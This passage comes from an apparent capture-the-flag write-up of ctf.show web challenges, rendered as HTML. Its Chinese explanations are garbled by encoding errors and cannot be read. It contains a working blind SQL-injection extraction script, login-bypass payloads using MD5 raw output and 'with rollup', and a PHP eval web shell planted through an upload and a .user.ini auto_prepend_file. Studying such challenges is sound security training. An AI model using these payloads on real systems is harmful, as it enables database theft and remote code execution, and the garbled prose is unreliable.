class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">import requests<br> <br>url = &#x27;http://9d1bf0f8-9f4f-4cd2-bd17-a1024a0d065c.challenge.ctf.show/index.php?id=-1<span class="hljs-comment">/**/</span>or<span class="hljs-comment">/**/</span>&#x27;<br>name = &#x27;&#x27;<br> <br># å¾ªç¯45æ¬¡( å¾ªç¯æ¬¡æ•°æŒ‰ç…§è¿”å›çš„å­—ç¬¦ä¸²é•¿åº¦è‡ªå®šä¹‰)<br>for i in range(1, 45):<br>    # è·å–å½“å‰ä½¿ç”¨çš„æ•°æ®åº“<br>    # payload = &#x27;ascii(substr(database()from<span class="hljs-comment">/**/</span>%d<span class="hljs-comment">/**/</span>for<span class="hljs-comment">/**/</span>1))=%d&#x27;<br>    # è·å–å½“å‰æ•°æ®åº“çš„æ‰€æœ‰è¡¨<br>    # payload = &#x27;ascii(substr((<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(table_name)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.tables<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>table_schema=<span class="hljs-keyword">database</span>())<span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>%d<span class="hljs-comment">/**/</span><span class="hljs-keyword">for</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>))=%d<span class="hljs-string">&#x27;</span><br><span class="hljs-string">    # è·å–flagè¡¨çš„å­—æ®µ</span><br><span class="hljs-string">    # payload = &#x27;</span>ascii(<span class="hljs-built_in">substr</span>((<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(column_name)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.columns<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>table_name=<span class="hljs-number">0x666C6167</span>)<span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>%d<span class="hljs-comment">/**/</span><span class="hljs-keyword">for</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>))=%d<span class="hljs-string">&#x27;</span><br><span class="hljs-string">    # è·å–flagè¡¨çš„æ•°æ®</span><br><span class="hljs-string">    payload = &#x27;</span>ascii(<span class="hljs-built_in">substr</span>((<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>flag<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>flag)<span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>%d<span class="hljs-comment">/**/</span><span class="hljs-keyword">for</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>))=%d<span class="hljs-string">&#x27;</span><br><span class="hljs-string">    count = 0</span><br><span class="hljs-string">    print(&#x27;</span>æ­£åœ¨è·å–ç¬¬ %d ä¸ªå­—ç¬¦<span class="hljs-string">&#x27; % i)</span><br><span class="hljs-string">    # æˆªå–SQLæŸ¥è¯¢ç»“æœçš„æ¯ä¸ªå­—ç¬¦, å¹¶åˆ¤æ–­å­—ç¬¦å†…å®¹</span><br><span class="hljs-string">    for j in range(31, 128):</span><br><span class="hljs-string">        result = requests.get(url + payload % (i, j))</span><br><span class="hljs-string"> </span><br><span class="hljs-string">        if &#x27;</span><span class="hljs-keyword">If</span><span class="hljs-string">&#x27; in result.text:</span><br><span class="hljs-string">            name += chr(j)</span><br><span class="hljs-string">            print(&#x27;</span>æ•°æ®åº“å/è¡¨å/å­—æ®µå/æ•°æ®: %s<span class="hljs-string">&#x27; % name)</span><br><span class="hljs-string">            break</span><br><span class="hljs-string"> </span><br><span class="hljs-string">        # å¦‚æœæŸä¸ªå­—ç¬¦ä¸å­˜åœ¨,åˆ™åœæ­¢ç¨‹åº</span><br><span class="hljs-string">        count += 1</span><br><span class="hljs-string">        if count &gt;= (128 - 31):</span><br><span class="hljs-string">            exit()</span><br></code></pre></td></tr></table></figure><p>è·å–æ•°æ®åº“<br><img src="/images/23.png"></p><p>è·å–è¡¨<br><img src="/images/233.png"></p><p>è·å–å­—æ®µ<br><img src="/images/2333.png"></p><p>è·å–flag<br><img src="/images/23333.png"></p><h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><p>è¿™é¢˜ä¸èƒ½ç”¨å¸¸è§„æ–¹æ³•åš<br>åœ¨urlä¸­è¾“å…¥index.phpsï¼Œå¯ä»¥å‘ç°ä¸‹è½½äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œæ‰“å¼€ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>        <span class="hljs-variable">$flag</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$password</span>)&gt;<span class="hljs-number">10</span>)&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;password error&quot;</span>);<br>&#125;<br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;select * from user where username =&#x27;admin&#x27; and password =&#x27;&quot;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$password</span>,<span class="hljs-literal">true</span>).<span class="hljs-string">&quot;&#x27;&quot;</span>;<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>,<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mysqli_num_rows</span>(<span class="hljs-variable">$result</span>)&gt;<span class="hljs-number">0</span>)&#123;<br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span>=<span class="hljs-title function_ invoke__">mysqli_fetch_assoc</span>(<span class="hljs-variable">$result</span>))&#123;<br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ç™»é™†æˆåŠŸ&lt;br&gt;&quot;</span>;<br> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br> &#125;<br>&#125;<br>    <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å‘ç°æ˜¯ä½¿ç”¨MD5åŠ å¯†ï¼Œåˆ©ç”¨MD5çš„æ¼æ´åœ¨å¯†ç ä¸­è¾“å…¥ffidyopï¼Œç™»å½•æˆåŠŸï¼Œå¾—åˆ°flag</p><h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><p>æ‰“å¼€é¡µé¢ï¼Œæ˜¯ç™»å½•é¡µé¢<br><img src="/images/258.png"></p><p>ç‚¹å‡»å–æ¶ˆï¼Œè‡ªåŠ¨ä¸‹è½½æºç æ–‡ä»¶index.phps</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">replaceSpecialChar</span>(<span class="hljs-params"><span class="hljs-variable">$strParam</span></span>)</span>&#123;<br>             <span class="hljs-variable">$regex</span> = <span class="hljs-string">&quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;</span>;<br>             <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$regex</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$strParam</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$con</span>)<br>        &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Could not connect: &#x27;</span> . <span class="hljs-title function_ invoke__">mysqli_error</span>());<br>        &#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$username</span>)!=<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-title function_ invoke__">replaceSpecialChar</span>(<span class="hljs-variable">$username</span>)))&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;sql inject error&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$password</span>)!=<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-title function_ invoke__">replaceSpecialChar</span>(<span class="hljs-variable">$password</span>)))&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;sql inject error&quot;</span>);<br>&#125;<br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;select * from user where username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>,<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mysqli_num_rows</span>(<span class="hljs-variable">$result</span>)&gt;<span class="hljs-number">0</span>)&#123;<br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span>=<span class="hljs-title function_ invoke__">mysqli_fetch_assoc</span>(<span class="hljs-variable">$result</span>))&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$password</span>==<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;password&#x27;</span>])&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ç™»é™†æˆåŠŸ&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br><br> &#125;<br>&#125;<br>    <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>  <figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nsis">if(<span class="hljs-keyword">strlen</span>(<span class="hljs-variable">$username</span>)!=<span class="hljs-keyword">strlen</span>(replaceSpecialChar(<span class="hljs-variable">$username</span>)))&#123;<br>die(<span class="hljs-string">&quot;sql inject error&quot;</span>)<span class="hljs-comment">;</span><br>&#125;<br>if(<span class="hljs-keyword">strlen</span>(<span class="hljs-variable">$password</span>)!=<span class="hljs-keyword">strlen</span>(replaceSpecialChar(<span class="hljs-variable">$password</span>)))&#123;<br>die(<span class="hljs-string">&quot;sql inject error&quot;</span>)<span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>   è‹¥è¦å•çº¯ç»•è¿‡$regex &#x3D; â€œ&#x2F;(select|from|where|join|sleep|and|\s|union|,)&#x2F;iâ€;è¿™ä¸ªè¿‡æ¥æ›¿æ¢ï¼Œç”¨åŒå†™ç»•è¿‡å³å¯ï¼Œ<br>    ä½†ä¸‹é¢è¿˜æœ‰é™åˆ¶ï¼ŒæŸ¥è¯¢å‡ºæ¥çš„å€¼è¦å’Œæˆ‘ä»¬postçš„å€¼ç›¸ç­‰ï¼š</p><p>  è¿™å°±ä½¿å¾—åŒå†™ä¸èƒ½ç”¨ï¼Œæ­¤å¤„åªèƒ½ç”¨ <strong>WITH ROLLUP</strong> è¿›è¡Œç»•è¿‡<br>   <strong>with rollup</strong> å¯ä»¥å¯¹ group by åˆ†ç»„ç»“æœå†æ¬¡è¿›è¡Œåˆ†ç»„ï¼Œå¹¶åœ¨æœ€åæ·»åŠ ä¸€è¡Œæ•°æ®ç”¨äºå±•ç¤ºç»“æœ(å¯¹group by æœªæŒ‡å®šçš„å­—æ®µè¿›è¡Œæ±‚å’Œæ±‡æ€»ï¼Œè€Œgroup byæŒ‡å®šçš„åˆ†ç»„å­—æ®µåˆ™ç”¨nullå ä½)</p><p>   æˆ‘ä»¬ä½¿ç”¨ä¸‡èƒ½é’¥åŒ™<code>(a&#39;/**/or/**/ture/**/#)</code>ä½¿SQLæˆç«‹ç»•è¿‡ç”¨æˆ·åä¹‹åï¼Œåå°çš„SQLä¼šæŸ¥è¯¢å‡ºæ‰€æœ‰çš„ç”¨æˆ·ä¿¡æ¯ï¼Œç„¶åä¾æ¬¡åˆ¤æ–­æŸ¥è¯¢å¤„çš„ç”¨æˆ·åå¯¹åº”çš„å¯†ç å’Œæˆ‘ä»¬è¾“å…¥çš„å¯†ç æ˜¯å¦ç›¸åŒï¼Œè¿™æ—¶å€™æˆ‘ä»¬ä½¿ç”¨with rollup å¯¹group by åˆ†ç»„çš„ç»“æœå†æ¬¡è¿›è¡Œæ±‚å’Œç»Ÿè®¡ï¼Œç”±äºwith rollup ä¸ä¼šå¯¹group by åˆ†ç»„çš„å­—æ®µ(password)è¿›è¡Œç»Ÿè®¡ï¼Œæ‰€ä»¥ä¼šåœ¨è¿”å›ç»“æœçš„æœ€åä¸€è¡Œç”¨nullæ¥å¡«å……passwordï¼Œè¿™æ ·ä¸€æ¥æˆ‘ä»¬çš„è¿”å›ç»“æœä¸­å°±æœ‰äº†ä¸€ä¸ªå€¼ä¸ºnullçš„passwordï¼Œåªè¦æˆ‘ä»¬ç™»å½•çš„æ—¶å€™passwordè¾“å…¥æ¡†ä»€ä¹ˆéƒ½ä¸è¾“ï¼Œé‚£ä¹ˆæˆ‘è¾“å…¥çš„passwordçš„å€¼å°±æ˜¯nullï¼Œè·ŸæŸ¥è¯¢å‡ºçš„ç”¨æˆ·å¯†ç ç›¸åŒ(null&#x3D;&#x3D;null)ï¼Œä»è€Œç™»å½•æˆåŠŸã€‚<br>   payloadï¼š<br>   <figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">a&#x27;<span class="hljs-comment">/**/</span><span class="hljs-literal">or</span><span class="hljs-comment">/**/</span><span class="hljs-literal">true</span><span class="hljs-comment">/**/</span>group<span class="hljs-comment">/**/</span>by<span class="hljs-comment">/**/</span>password<span class="hljs-comment">/**/</span><span class="hljs-keyword">with</span><span class="hljs-comment">/**/</span>rollup<span class="hljs-comment">/**/</span><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure></p><p>   å¾—åˆ°flag</p><h2 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">replaceSpecialChar</span>(<span class="hljs-params"><span class="hljs-variable">$strParam</span></span>)</span>&#123;<br>             <span class="hljs-variable">$regex</span> = <span class="hljs-string">&quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;</span>;<br>             <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$regex</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$strParam</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$password</span>)!=<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-title function_ invoke__">replaceSpecialChar</span>(<span class="hljs-variable">$password</span>)))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;sql inject error&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$password</span>==<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;password&#x27;</span>])&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;error&quot;</span>;<br>        &#125;<br></code></pre></td></tr></table></figure><p>æœ¬é¢˜å’Œweb10æœ‰å¾ˆå¤šç›¸åŒçš„åœ°æ–¹ï¼Œä½†æ˜¯è¿™ä¸€é¢˜å‡ºflagçš„æ¡ä»¶æ˜¯<code>$password==$_SESSION[&#39;password&#39;]</code> passwordæ˜¯æˆ‘ä»¬è‡ªå·±è¾“å…¥çš„ï¼Œsessionä¸­çš„passwordå­˜å‚¨åœ¨æœ¬åœ°ï¼Œæ‰€ä»¥æˆ‘ä»¬åªè¦è¾“å…¥ç©ºå¯†ç ï¼Œå¹¶ä¸”å°†æœ¬åœ°çš„sessionåˆ é™¤å³å¯æˆåŠŸç»•è¿‡,è·å¾—flag<br><img src="/images/259.png"></p><p>Sessionæ˜¯å¦ä¸€ç§è®°å½•å®¢æˆ·çŠ¶æ€çš„æœºåˆ¶ï¼Œå®ƒæ˜¯åœ¨æœåŠ¡å™¨ä¸Šé¢ï¼Œå®¢æˆ·ç«¯æµè§ˆå™¨è®¿é—®æœåŠ¡å™¨çš„æ—¶å€™ï¼ŒæœåŠ¡å™¨æŠŠå®¢æˆ·ç«¯ä¿¡æ¯ä»¥æŸç§å½¢å¼è®°å½•åœ¨æœåŠ¡å™¨ä¸Šã€‚è¿™å°±æ˜¯Sessionã€‚å®¢æˆ·ç«¯æµè§ˆå™¨å†æ¬¡è®¿é—®æ—¶åªéœ€è¦ä»è¯¥Sessionä¸­æŸ¥æ‰¾è¯¥å®¢æˆ·çš„çŠ¶æ€å°±å¯ä»¥äº†ã€‚<br><a href="https://www.cnblogs.com/l199616j/p/11195667.html">sessionä¸cookieä¼ é€é—¨</a></p><p>æˆ–è€…æˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨burp suiteæ¥åšé¢˜<br>å…ˆæŠ“ç™»å½•çš„åŒ…<br><img src="/images/K.png"><br>æ­¤æ—¶æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¯†ç æ˜¯123456ï¼Œä½†æäº¤äº†è¿™ä¸ªå¯†ç åˆæ˜¯é”™è¯¯çš„ï¼Œè¿™é‡Œæˆ‘ä»¬æŠŠcookieçš„å†…å®¹åˆ é™¤äº†ï¼Œå¯†ç 123456ä¹Ÿåˆ é™¤æ‰<br><img src="/images/xx.png"><br>å¤§åŠŸå‘Šæˆï¼</p><h2 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h2><p>æ‰“å¼€ç½‘ç«™å‘ç°æ²¡æœ‰å¯ç”¨çš„æ³¨å…¥ç‚¹ï¼Œåº”è¯¥ä¸æ˜¯æ³¨å…¥äº†ï¼Œctrl+uæŸ¥çœ‹æºç ï¼Œå‘ç°æç¤º<code>?cmd=</code><br><img src="/images/0102.png"></p><p>åœ¨ç½‘ç«™ä¸Šè¾“å…¥<code>?cmd=phpinfo();</code> (phpinfoå‡½æ•°å¯ä»¥æ˜¾ç¤ºå‡ºPHP æ‰€æœ‰ç›¸å…³ä¿¡æ¯ã€‚æ˜¯æ’æŸ¥é…ç½®phpæ˜¯æ˜¯å¦å‡ºé”™æˆ–æ¼é…ç½®æ¨¡å—çš„ä¸»è¦æ–¹å¼ä¹‹ä¸€ï¼)å‘ç°æœ‰å›æ˜¾<br><img src="/images/nt.png"></p><p>è¿™é‡Œä¼šç”¨åˆ°ä¸€ä¸ªphpå‡½æ•°glob();<br>glob()å‡½æ•°è¿”å›åŒ¹é…æŒ‡å®šæ¨¡å¼çš„æ–‡ä»¶åæˆ–ç›®å½•ã€‚<br>ä¾‹ï¼š<br>glob(â€œ*â€)åŒ¹é…ä»»æ„æ–‡ä»¶<br>glob(â€œ.txtâ€)åŒ¹é…ä»¥txtä¸ºåç¼€çš„æ–‡ä»¶</p><p>æœ‰äº†è¿™ä¸ªæ–¹æ³•æˆ‘ä»¬å¯ä»¥å…ˆæŠŠå½“å‰ç›®å½•ä¸‹æ‰€æœ‰çš„æ–‡ä»¶æ‰¾å‡ºæ¥çœ‹çœ‹æœ‰æ²¡æœ‰å¯ç”¨çš„ï¼Œ<br>è¾“å…¥<code>?cmd=print_r(glob(&quot;*&quot;));</code><br>æ­¤æ—¶é¡µé¢æ˜¾ç¤ºäº†å¦‚ä¸‹å†…å®¹<br><img src="/images/MC.png"></p><p>æˆ‘ä»¬è¯•ä¸€ä¸‹ç¬¬ä¸€ä¸ªphpæ–‡ä»¶<br>è¿™æ˜¯æˆ‘ä»¬ä½¿ç”¨highlight_file()å‡½æ•°æ˜¾ç¤ºphpæ–‡ä»¶<br><img src="/images/BM.png"><br>è·å¾—flag</p><h2 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h2><p>è¿›å…¥é¢˜ç›®ï¼Œå‘ç°æ˜¯ä¸€é“æ–‡ä»¶ä¸Šä¼ é¢˜ï¼Œ<br>å…ˆåœ¨urlä¸­è¾“å…¥upload.php.bak(bakæ˜¯å¤‡ä»½æ–‡ä»¶)<br>ä¸‹è½½äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;content-type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-variable">$temp_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br><span class="hljs-variable">$size</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>];<br><span class="hljs-variable">$error</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;error&#x27;</span>];<br><span class="hljs-variable">$arr</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$filename</span>);<br><span class="hljs-variable">$ext_suffix</span> = <span class="hljs-variable">$arr</span>[<span class="hljs-string">&#x27;extension&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$size</span> &gt; <span class="hljs-number">24</span>)&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error file zise&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$filename</span>)&gt;<span class="hljs-number">9</span>)&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error file name&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$ext_suffix</span>)&gt;<span class="hljs-number">3</span>)&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error suffix&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/php/i&quot;</span>,<span class="hljs-variable">$ext_suffix</span>))&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error suffix&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/php/i&quot;</span>),<span class="hljs-variable">$filename</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error file name&quot;</span>);<br>    &#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_name</span>, <span class="hljs-string">&#x27;./&#x27;</span>.<span class="hljs-variable">$filename</span>))&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼&quot;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼&quot;</span>;<br>&#125;<br><br> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å‘ç°ä¸Šä¼ è¿‡æ»¤äº†phpå¤§å°å†™ï¼Œå°±æ˜¯è¯´ä¸Šä¼ çš„å†…å®¹ä¸èƒ½ä¸º.phpåç¼€äº†ï¼ŒåŒæ—¶ä¸Šä¼ æ–‡ä»¶å¤§å°ä¸èƒ½å¤§äº24å­—èŠ‚ï¼Œæ–‡ä»¶åä¸èƒ½å¤§äº9<br>æ‰€ä»¥æˆ‘ä»¬å†™ä¸€ä¸ª1.txtæ–‡ä»¶ï¼Œå†…å®¹ä¸º<code>&lt;?php eval($_POST[&#39;a&#39;]);</code><br>åˆšå¥½24å­—èŠ‚<br>ä¸Šä¼ æˆåŠŸï¼Œå†å†™ä¸€ä¸ª.user.iniæ–‡ä»¶ï¼Œå†…å®¹ä¸º <code>auto_prepend_file=1.txt</code><br>ä¸Šä¼ æˆåŠŸåï¼Œæ‰“å¼€ä¸­å›½èšå‰‘ï¼Œè¿æ¥æˆåŠŸåå‘ç°æ²¡æœ‰æƒé™æ“ä½œï¼Œå›åˆ°é¡µé¢ï¼ŒPOSTæäº¤<br><code>a=print_r(glob(&quot;*&quot;));</code><br>å‘ç°ä¸€ä¸²é•¿çš„phpæ–‡ä»¶ï¼Œ<code>a=highlight_file(&#39;903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php&#39;);</code><br>æäº¤åæˆåŠŸæ˜¾ç¤ºflag</p><h2 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h2><p>php sleep()å‡½æ•°çš„æ„æ€æ˜¯æ‹¬å·é‡Œç­‰äºå‡ é¡µé¢å°±ä¼šç­‰å¾…å¤šå°‘ç§’æ‰§è¡Œ<br>çœ‹äº†ä¸€éå‘ç°case 3é€‚åˆæˆ‘ä»¬å»è¯•è¯•,å› ä¸ºcase 3åæ²¡æœ‰breakï¼Œåœ¨ç­‰å¾…3ç§’åå°±ä¼šæ‰§è¡Œ3å’Œcase 6000çš„å†…å®¹ï¼ŒæŠŠurlæ˜¾ç¤ºå‡ºæ¥<br>urlè¾“å…¥?c&#x3D;3<br><img src="/images/U1PFC.png"><br>urlè¾“å…¥å¾—åˆ°çš„ä¿¡æ¯<br><img src="/images/5TH.png"><br>è¿›å…¥ä¸€ä¸ªæ–°çš„é¡µé¢<br>æ˜¾è€Œæ˜“è§æ˜¯ä¸ªsqlæ³¨å…¥<br>å…ˆæŸ¥çœ‹æºç ï¼Œæå–å…³é”®ä¿¡æ¯</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">if</span>(preg<span class="hljs-constructor">_match(&#x27;<span class="hljs-operator">/</span><span class="hljs-params">information_schema</span>\.<span class="hljs-params">tables</span>|<span class="hljs-params">information_schema</span>\.<span class="hljs-params">columns</span>|<span class="hljs-params">linestring</span>| |<span class="hljs-params">polygon</span><span class="hljs-operator">/</span><span class="hljs-params">is</span>&#x27;, $<span class="hljs-params">_GET</span>[&#x27;<span class="hljs-params">query</span>&#x27;])</span>)&#123;<br>die(&#x27;@A@&#x27;);<br>&#125;<br></code></pre></td></tr></table></figure><p>å‘ç°äº†è¿‡æ»¤äº† <code>information_schema.tables</code><br><code>information_schema.columns</code><br><code>linestring polygon</code><br>è¿˜æœ‰ç©ºæ ¼<br>ç©ºæ 